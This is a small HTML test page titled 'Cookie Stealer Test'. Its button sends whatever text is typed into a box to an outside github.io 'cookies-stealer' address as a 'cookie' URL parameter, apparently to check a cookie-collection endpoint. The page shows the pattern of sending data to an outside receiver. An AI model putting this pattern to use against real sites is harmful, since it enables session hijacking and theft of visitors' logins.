<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Cookie Stealer Test</title>
</head>
<body>
  <input type="text" id="inputText" placeholder="入力してください">
  <button onclick="sendInput()">送信</button>

  <script>
    function sendInput() {
      const input = document.getElementById('inputText').value;
      location.href = "https://masa-pokemon.github.io/cookies-stealer/?cookie=" + encodeURIComponent(input);
    }
  </script>
</body>
</html>
